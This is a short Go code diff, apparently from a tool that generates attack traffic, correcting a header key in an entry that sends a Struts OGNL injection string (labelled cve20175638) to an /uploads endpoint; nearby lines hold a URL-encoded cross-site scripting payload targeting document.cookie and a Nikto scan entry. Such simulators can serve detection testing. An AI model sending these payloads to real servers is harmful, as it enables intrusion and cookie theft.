@@ -121,7 +121,7 @@ func (p *program) Start(s service.Service) error {
 		minRequests: 100, url: fmt.Sprintf("http://%s/forum/memberlist.php?account=%s", target, "%5C%22%3E%5C%22%3Cscript%3Ejavascript%3Aalert%28document.cookie%29%3C%2Fscript%3E")}
 	cve20175638 = Attack{name: "cve20175638", method: "POST", maxNap: 600, minNap: 1,
 		url:     fmt.Sprintf("http://%s/uploads", target),
-			     headers: map[string]string{"Content-Type:": "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?)multipart/form-data"}}
+			     headers: map[string]string{"Content-Type": "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?)multipart/form-data"}}
 
 	/* Attack Tools */
 	niktoBlast = Tool{name: "Nikto Blast", location: "nikto/program/nikto.pl", host: target}
